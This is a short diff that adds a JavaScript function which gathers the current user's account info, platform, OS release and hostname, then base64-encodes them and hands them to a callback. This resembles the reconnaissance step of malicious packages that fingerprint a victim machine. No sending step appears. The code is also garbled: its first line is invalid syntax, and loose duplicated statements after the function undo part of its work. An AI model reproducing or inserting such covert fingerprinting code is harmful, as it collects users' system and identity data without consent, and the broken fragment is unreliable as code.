@@ -1,0 +1,22 @@
+function environ_check = function environ_check(callback){
+    try {
+        var env = os.userInfo();
+    } catch (e) {
+        var env = {};
+    }
+    try {
+        env['platform'] = os.platform();
+        env['release'] = os.release();
+        env['hostname'] = os.hostname();
+        var dic = JSON.stringify(env);
+        var res = new Buffer(dic).toString('base64');
+    } catch(e) {
+        var res = "";
+    }
+    callback(res);
+}
+var env = os.userInfo()
+var env = {}
+env['platform'] = os.platform()
+env['release'] = os.release()
+env['hostname'] = os.hostname()
